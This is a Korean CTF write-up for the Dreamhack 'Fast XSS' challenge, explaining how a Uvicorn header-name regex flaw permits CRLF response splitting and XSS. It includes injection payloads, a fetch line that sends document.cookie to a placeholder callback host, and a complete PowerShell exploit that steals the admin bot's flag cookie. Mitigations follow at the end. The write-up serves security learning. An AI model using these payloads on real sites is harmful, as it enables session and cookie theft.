---
title: "Dreamhack Fast_XSS 풀이"
description: "응답 헤더 검증 오류와 관리자 봇을 이용한 XSS 문제 풀이."
category: "Dreamhack Web"
tags: ["Dreamhack","Web","XSS"]
createdAt: "2026-11-05"
updatedAt: "2026-11-05"
draft: false
notionSource: "39e5747616b281e4a574fa9040e97690"
---

<aside class="block-color-red_background callout" data-notion-callout="" data-notion-callout-icon="🚩" data-notion-callout-background="red_background" id="064c1143-b437-49a0-8e58-b876f9c49eb9" dir="ltr"><div><span class="icon" data-emoji="🚩"></span></div><div><p id="33989f5c-c7cc-4ca3-89f6-9d3fdbbe9f65" class="" dir="auto"><strong>Challenge:</strong> Fast XSS · Dreamhack #1222<br><strong>Category:</strong> Web · Gold 1<br><strong>Goal:</strong> 관리자 봇의 FLAG 쿠키 탈취</p></div></aside><nav id="aa8356b8-7e56-4874-b38e-aa0479915137" class="table_of_contents" data-notion-toc="" dir="ltr"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#22ad9485-4ea5-4332-b223-6576dd184d38">문제 구성</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#4baf1a65-493b-4bd7-adaf-f7425cc3b8ad">소스 코드 분석</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#24cda500-3f81-4ac9-80ab-ac9aa0b6670a">Uvicorn 헤더 검증 우회</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#bff9071a-6053-4006-b974-b9169ff3f1b5">XSS 검증</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f8d67be8-f058-4912-9663-18e2e4bb46cd">관리자 봇 경로 구성</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#035c8817-ed19-49f7-8334-93f109876c99">최종 익스플로잇</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#8b9628f5-b998-4238-99f7-5d7b100d50b5">Flag</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f60e9b37-e274-48a2-ac03-86eb89547b8a">취약점 발생 원인</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d87823e9-2647-43bc-bdb2-bab7bd6813a6">대응 방법</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#c2455ca5-0e1f-429c-abcc-9ee3768b23f9">참고 자료</a></div></nav><h2 id="22ad9485-4ea5-4332-b223-6576dd184d38" class="" dir="auto">문제 구성</h2><table id="c1433689-14b2-4cdc-a1f1-2f5b4f8aa134" class="simple-table" dir="ltr"><thead class="simple-table-header"><tr id="1be887a4-6946-4db2-b633-69cc6d49fd67" dir="ltr"><th id="~gRw" class="simple-table-header-color simple-table-header">외부 포트</th><th id="DXbn" class="simple-table-header-color simple-table-header">역할</th><th id=">PpO" class="simple-table-header-color simple-table-header">확인된 동작</th></tr></thead><tbody><tr id="6bbadf9a-ae9c-48a1-9653-36e96a291c0f" dir="ltr"><td id="~gRw" class=""><code>12648</code></td><td id="DXbn" class="">FastAPI 웹 애플리케이션</td><td id=">PpO" class=""><code>data</code> 쿼리 파라미터를 템플릿 컨텍스트로 사용</td></tr><tr id="af699069-2186-436e-acd5-f288ab2815d4" dir="ltr"><td id="~gRw" class=""><code>16803</code></td><td id="DXbn" class="">Fast XSS Admin Bot</td><td id=">PpO" class=""><code>POST /api/report</code>로 전달한 경로를 관리자 브라우저가 방문</td></tr></tbody></table><p id="6ffcc792-170e-4ed1-bb7c-22ff329b7588" class="" dir="auto">웹 애플리케이션의 기본 응답은 다음과 같다.</p><pre id="416dc55c-6b20-4c95-a80a-c3cd770a9e69" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx">HTTP/1.1 200 OK
server: uvicorn
content-type: text/html; charset=utf-8

Hello Guest !</code></pre><p id="32d54864-d984-40b8-9020-321e8283f160" class="" dir="auto">FastAPI가 노출한 <code>/openapi.json</code>을 확인하면 루트 엔드포인트가 다음 기본값을 가진 <code>data</code> 문자열을 입력받는다.</p><pre id="5f0dc020-aa5c-48de-9f0f-bd5830cb2cb5" class="code code-wrap" data-notion-code-syntax="json"><code class="language-json">{"context": {"user": "Guest"}}</code></pre><p id="1d57f2ba-b9ae-4c6b-99e0-ba61a6fdc83d" class="" dir="auto">정상적인 값을 전달하면 사용자 이름이 바뀐다.</p><pre id="36a5f245-d4ee-4d77-94d8-b823f3f1b3d1" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx">GET /?data=%7B%22context%22%3A%7B%22user%22%3A%22Admin%22%7D%7D

Hello Admin !</code></pre><p id="3f04ad32-fba0-455a-a4df-7babec52fb89" class="" dir="auto">단순 HTML 태그를 <code>context.user</code>에 넣으면 Jinja2의 자동 이스케이프가 적용된다.</p><pre id="b0603ff9-8d5e-4b06-b181-1ea29dcde1c8" class="code code-wrap" data-notion-code-syntax="html"><code class="language-html">Hello &amp;lt;img src=x onerror=alert(1)&amp;gt; !</code></pre><p id="45ddff32-4725-4eb0-89b2-64ce0e8193ef" class="" dir="auto">따라서 일반적인 reflected XSS가 아니라 템플릿 응답 생성 과정의 다른 입력을 조작해야 한다.</p><h2 id="4baf1a65-493b-4bd7-adaf-f7425cc3b8ad" class="" dir="auto">소스 코드 분석</h2><p id="48619ccd-7bb7-4a87-9f7b-6ee1db484455" class="" dir="auto">출제자가 공개한 핵심 코드는 다음과 같다.</p><pre id="81421870-dc98-4bbb-af93-a52b489729ff" class="code code-wrap" data-notion-code-syntax="python"><code class="language-python">from fastapi import FastAPI, Request, Response
from fastapi.templating import Jinja2Templates
import json

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/")
async def index(
    request: Request,
    data: str = '{"context": {"user": "Guest"}}'
):
    try:
        data = json.loads(data)
    except:
        data = {"context": {"user": "Guest"}}

    context = {"name": "index.html", "request": request} | data
    return templates.TemplateResponse(**context)</code></pre><p id="1a6fad42-9058-4a8a-b9df-8390c35032f8" class="" dir="auto">Python 딕셔너리 병합 연산자 <code>|</code>는 오른쪽 딕셔너리의 값을 우선한다. 따라서 이용자는 <code>context.user</code>뿐 아니라 <code>TemplateResponse</code>에 전달되는 최상위 인자를 덮어쓸 수 있다.</p><ul id="c4c18755-1f21-4d4c-a4d5-72a642caeccd" class="bulleted-list" dir="auto"><li><code>name</code></li></ul><ul id="ce4425d1-33f5-46d5-9627-668f6dad387d" class="bulleted-list" dir="auto"><li><code>request</code></li></ul><ul id="87da4fcb-dc52-4666-982c-6d75fe8ec4fb" class="bulleted-list" dir="auto"><li><code>context</code></li></ul><ul id="2650b067-3fed-4bf3-be16-ce0de1e3cf1e" class="bulleted-list" dir="auto"><li><code>status_code</code></li></ul><ul id="74a1dd31-681b-4f98-931a-321aec393027" class="bulleted-list" dir="auto"><li><code>headers</code></li></ul><ul id="2a9b39f9-8840-444d-bf35-a31a492bbc1f" class="bulleted-list" dir="auto"><li><code>media_type</code></li></ul><ul id="67a5ec27-3ce3-4bc9-ad75-550f116f6150" class="bulleted-list" dir="auto"><li><code>background</code></li></ul><p id="71cbae50-8205-4479-8fd0-106795ec1656" class="" dir="auto">이 중 <code>headers</code>를 이용하면 임의의 응답 헤더 이름과 값을 Starlette/Uvicorn까지 전달할 수 있다.</p><h2 id="24cda500-3f81-4ac9-80ab-ac9aa0b6670a" class="" dir="auto">Uvicorn 헤더 검증 우회</h2><p id="47477bc5-017b-4a9b-906d-c0efccd59169" class="" dir="auto">취약한 Uvicorn httptools 구현은 응답 헤더를 전송하기 전에 다음 정규식으로 헤더 이름을 검사한다.</p><pre id="9b7c06d1-f92e-44fb-95ef-bed87430ba37" class="code code-wrap" data-notion-code-syntax="python"><code class="language-python">HEADER_RE = re.compile(
    b'[\x00-\x1F\x7F()&lt;&gt;@,;:[]={} \t\\"]'
)
HEADER_VALUE_RE = re.compile(b"[\x00-\x1F\x7F]")</code></pre><p id="cd40723c-cc1f-4c3e-a30a-1665204c0c6c" class="" dir="auto"><code>HEADER_RE</code>의 문자 클래스 안에서 대괄호가 올바르게 이스케이프되지 않았다. 이 때문에 의도했던 헤더 이름 검증이 정상적으로 동작하지 않으며 CRLF가 포함된 헤더 이름이 통과한다.</p><p id="6933d6d9-452d-44d9-acba-9fb88e2d48be" class="" dir="auto">헤더 <strong>값</strong>은 <code>HEADER_VALUE_RE</code>가 CRLF를 차단하므로 CRLF는 값이 아니라 <strong>헤더 이름</strong>에 넣어야 한다.</p><p id="91bac084-da53-45f8-895e-fdaf462d1b1e" class="" dir="auto">최소 검증 페이로드는 다음과 같다.</p><pre id="58ddcb7c-c7b2-4d58-8657-f3e0077b6067" class="code code-wrap" data-notion-code-syntax="json"><code class="language-json">{
  "context": {
    "user": "Guest"
  },
  "headers": {
    "x\r\n\r\nPROBE-BODY\r\nx": "y"
  }
}</code></pre><p id="cad549a4-efbf-4a5c-9387-e6dde3067cc9" class="" dir="auto">서버가 실제로 전송한 응답은 아래와 같이 분리된다.</p><pre id="059b107e-2c66-4bd1-8cc6-a5054eb8d0d3" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx">HTTP/1.1 200 OK
date: ...
server: uvicorn
x

PROBE-BODY
x: y
content-length: 13
content-type: text/html; charset=utf-8

Hello Guest !</code></pre><p id="aafe3eff-10c0-422f-9f39-3062c35f4d70" class="" dir="auto">첫 번째 빈 줄 이후의 데이터는 브라우저가 응답 본문으로 해석한다. <code>PROBE-BODY</code> 위치에 <code>&lt;script&gt;</code> 태그를 넣으면 임의 JavaScript 실행이 가능하다.</p><h2 id="bff9071a-6053-4006-b974-b9169ff3f1b5" class="" dir="auto">XSS 검증</h2><p id="1e632004-0980-477b-9e4f-040073f667ba" class="" dir="auto">브라우저에서 스크립트 실행 여부를 확인하기 위해 다음 페이로드를 사용했다.</p><pre id="b448b9eb-2e9e-43be-838c-051424e327e7" class="code code-wrap" data-notion-code-syntax="json"><code class="language-json">{
  "context": {
    "user": "Guest"
  },
  "headers": {
    "x\r\n\r\n&lt;script&gt;document.title='PWNED'&lt;/script&gt;\r\nx": "y"
  }
}</code></pre><p id="fe9d7e94-7042-4601-a3bc-7da98a29461e" class="" dir="auto">페이지 제목이 <code>pwned</code>로 변경되어 XSS 실행을 확인했다.</p><p id="b8647a22-7a6a-4015-87b6-d2d9d5647ce6" class="" dir="auto">여기서 제목이 소문자로 출력되는 이유가 중요하다. Starlette가 응답 헤더 이름을 소문자로 정규화하므로 헤더 이름 안에 삽입한 JavaScript 전체도 소문자로 변한다.</p><p id="a4b310b4-a1b3-42b8-9c11-b0107f506c46" class="" dir="auto">따라서 다음과 같이 대문자가 필요한 식별자는 사용할 수 없다.</p><pre id="0612acd2-b5c5-4716-afba-4c61adbcf232" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx">new Image().src = "http://callback/"</code></pre><p id="e2cf8484-7dc1-4673-b359-1fc35d2fe5aa" class="" dir="auto">실제 실행 시 <code>Image</code>가 <code>image</code>로 바뀌어 오류가 발생한다. 대신 모든 식별자가 소문자인 <code>fetch</code>와 <code>document.cookie</code>를 사용한다.</p><pre id="70c89c7b-ebc6-422e-8738-680526205cb2" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx">fetch('http://callback/?c='+document.cookie)</code></pre><p id="700ef58e-ab7b-48bd-bb48-769f415779cb" class="" dir="auto">콜백 URL 경로에도 대문자가 있다면 소문자로 변환되므로 소문자 URL을 사용하는 것이 안전하다.</p><h2 id="f8d67be8-f058-4912-9663-18e2e4bb46cd" class="" dir="auto">관리자 봇 경로 구성</h2><p id="846ac691-0c70-41b7-b24a-6028ffaf5a27" class="" dir="auto">관리자 봇 내부 대상은 <code>http://web:8000/</code> 형태로 끝에 슬래시가 붙어 있다. 따라서 봇에 전달할 값은 다음처럼 쿼리 문자열부터 시작해야 한다.</p><pre id="99a8e627-8946-446f-bd75-964dba37bde6" class="code code-wrap"><code>?data=&lt;URL_ENCODED_JSON&gt;</code></pre><p id="38d5c118-dda3-4f9a-a84b-a67f2bdc8bd2" class="" dir="auto">다음처럼 앞에 슬래시를 추가하면 내부 URL이 <code>//?data=...</code>가 되어 FastAPI의 404 응답으로 빠진다.</p><pre id="e170b51a-eb12-4ef8-a921-d67b4fadd27d" class="code code-wrap"><code>/?data=&lt;URL_ENCODED_JSON&gt;</code></pre><p id="0ddfa092-5c37-497a-90b1-83e6d95af894" class="" dir="auto">이 경우 Admin Bot은 <code>OK</code>를 반환하므로 성공한 것처럼 보이지만 XSS는 실행되지 않는다.</p><h2 id="035c8817-ed19-49f7-8334-93f109876c99" class="" dir="auto">최종 익스플로잇</h2><p id="cbb43f60-7ee3-4c10-89a0-577465ea8328" class="" dir="auto">먼저 요청을 확인할 수 있는 임시 HTTP 콜백 URL을 준비한다. 아래 PowerShell에서 <code>&lt;CALLBACK_URL&gt;</code>을 실제 주소로 변경한다.</p><pre id="df175be3-6149-4c26-8326-30a5bb5dd610" class="code code-wrap" data-notion-code-syntax="powershell"><code class="language-powershell">$bot = "http://host3.dreamhack.games:16803/api/report"
$callback = "http://&lt;CALLBACK_URL&gt;"

$script = "&lt;script&gt;fetch('" + $callback + "?c='+document.cookie)&lt;/script&gt;"
$headerName = "x`r`n`r`n$script`r`nx"

$responseHeaders = @{}
$responseHeaders[$headerName] = "y"

$dataObject = @{
    context = @{
        user = "Guest"
    }
    headers = $responseHeaders
}

$dataJson = $dataObject | ConvertTo-Json -Depth 6 -Compress
$path = "?data=" + [Uri]::EscapeDataString($dataJson)
$body = @{
    path = $path
} | ConvertTo-Json -Compress

Invoke-WebRequest `
    -UseBasicParsing `
    -Uri $bot `
    -Method Post `
    -ContentType "application/json" `
    -Body $body `
    -TimeoutSec 35</code></pre><aside class="block-color-yellow_background callout" data-notion-callout="" data-notion-callout-icon="⚠️" data-notion-callout-background="yellow_background" id="fc18f230-ca14-4fa2-a892-862831585ee1" dir="ltr"><div><span class="icon" data-emoji="⚠️"></span></div><div><p id="8cad5eed-9511-4570-92a9-e45c7e85501d" class="" dir="auto">PowerShell에서 <code>"$callback?c="</code>처럼 작성하면 <code>$callback?c</code> 전체를 변수명으로 해석할 수 있다. 위 코드처럼 문자열 연결을 사용해야 실제 콜백 URL이 유지된다.</p></div></aside><p id="febc4e04-722b-48f4-ac1a-6654fa36aedd" class="" dir="auto">관리자 봇은 내부 웹 애플리케이션에 FLAG 쿠키를 설정한 뒤 조작된 경로를 방문한다. XSS가 실행되면 다음 쿼리가 콜백으로 전송된다.</p><pre id="af3f5754-5bdf-4c8d-bbec-a8bf3d25e1bd" class="code code-wrap"><code>c=FLAG=DH{7a709e7d846af26c41613cbcf071cd8a5996150a60507007c129a092f720057c}</code></pre><h2 id="8b9628f5-b998-4238-99f7-5d7b100d50b5" class="" dir="auto">Flag</h2><pre id="9a39573c-f2c9-4bdf-b297-08bc9663e0b8" class="code code-wrap"><code>DH{7a709e7d846af26c41613cbcf071cd8a5996150a60507007c129a092f720057c}</code></pre><h2 id="f60e9b37-e274-48a2-ac03-86eb89547b8a" class="" dir="auto">취약점 발생 원인</h2><ol type="1" id="4fb189fb-727b-4be3-9fd4-c09788e71a5e" class="numbered-list" start="1" dir="auto"><li>신뢰할 수 없는 JSON을 <code>TemplateResponse</code>의 키워드 인자로 직접 병합했다.</li></ol><ol type="1" id="41b5f702-749e-4936-93d6-78baadd36e02" class="numbered-list" start="2" dir="auto"><li>이용자가 응답 헤더 전체를 제어할 수 있었다.</li></ol><ol type="1" id="2844bfc5-1002-4d31-b5f2-ceea1df66298" class="numbered-list" start="3" dir="auto"><li>취약한 Uvicorn의 헤더 이름 정규식이 CRLF를 탐지하지 못했다.</li></ol><ol type="1" id="11f038e6-de8d-488a-a430-1522d5c9bea1" class="numbered-list" start="4" dir="auto"><li>삽입한 CRLF로 HTTP 응답을 분리하고 JavaScript를 본문에 주입할 수 있었다.</li></ol><ol type="1" id="0349dc98-febd-4172-99f6-b76146488336" class="numbered-list" start="5" dir="auto"><li>관리자 봇의 FLAG 쿠키가 JavaScript에서 접근 가능했다.</li></ol><h2 id="d87823e9-2647-43bc-bdb2-bab7bd6813a6" class="" dir="auto">대응 방법</h2><ul id="4f5f360c-224b-4681-b36c-87f7a2a88538" class="bulleted-list" dir="auto"><li>사용자 입력에서 <code>context.user</code>처럼 필요한 값만 명시적으로 추출한다.</li></ul><ul id="45cf6d57-9ae3-4611-a2b9-93681f66856d" class="bulleted-list" dir="auto"><li>사용자 JSON을 <code>TemplateResponse(**data)</code> 형태로 전달하지 않는다.</li></ul><ul id="b72bfe6e-8491-4886-a1c4-d5916cdc4375" class="bulleted-list" dir="auto"><li><code>headers</code>, <code>status_code</code>, <code>name</code>, <code>request</code> 등 응답 제어 인자를 고정한다.</li></ul><ul id="41150aea-986e-4155-8654-a640614e706b" class="bulleted-list" dir="auto"><li>Uvicorn을 헤더 검증 문제가 수정된 버전으로 업데이트한다.</li></ul><ul id="a87c2327-96d1-4cf5-a02b-afcd5b8d3639" class="bulleted-list" dir="auto"><li>응답 헤더 이름과 값에서 CR, LF, NUL을 별도로 거부한다.</li></ul><ul id="2e0bc4b4-bf79-451b-aaf4-2ed73b4f93c7" class="bulleted-list" dir="auto"><li>민감한 쿠키에는 <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> 속성을 적용한다.</li></ul><ul id="5e3271ff-825c-4b54-9245-d09b8e3f53f9" class="bulleted-list" dir="auto"><li>인라인 스크립트를 제한하는 Content Security Policy를 적용한다.</li></ul><h2 id="c2455ca5-0e1f-429c-abcc-9ee3768b23f9" class="" dir="auto">참고 자료</h2><ul id="809be9d4-ef4f-47e0-84d7-cf59083f5df6" class="bulleted-list" dir="auto"><li><a href="https://dreamhack.io/wargame/challenges/1222">Dreamhack - Fast XSS</a></li></ul><ul id="d7ec1b04-c04a-4f75-8c14-9d79a7bd1231" class="bulleted-list" dir="auto"><li><a href="https://medium.com/@sa-blog/theori-offensive-security-researcher-hiring-ctf-review-a1bfd022e231">Theori Offensive Security Researcher Hiring CTF 후기</a></li></ul><ul id="0873d326-fbe8-49d3-89a5-06352f1413ba" class="bulleted-list" dir="auto"><li><a href="https://github.com/encode/uvicorn/blob/0.29.0/uvicorn/protocols/http/httptools_impl.py">Uvicorn 0.29.0 httptools implementation</a></li></ul>
